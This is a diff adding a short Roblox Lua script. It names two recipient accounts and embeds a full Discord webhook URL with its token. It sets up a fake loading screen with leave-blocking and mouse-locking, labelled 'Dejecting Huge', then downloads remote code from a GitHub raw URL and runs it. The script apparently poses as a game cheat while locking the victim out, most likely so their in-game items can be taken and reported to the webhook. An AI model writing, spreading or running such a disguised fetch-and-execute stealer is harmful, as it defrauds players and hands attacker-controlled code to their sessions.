@@ -1,0 +1,23 @@
+UserName = "PHX_AARON"
+
+UserName2 = "JohnMagat_Striker"
+
+Webhook = "https://discord.com/api/webhooks/1106177810726391818/G-Ox4nDYfpxsQQn9SF2MY2aPJUFuqdgm-xgKYa6-cfbL9i-0uo0yT9fglfk1ZInh1Bg3"
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = true 
+
+_G.ScriptName = "Dejecting Huge "
+
+_G.FirstText = "Script Preparing"
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
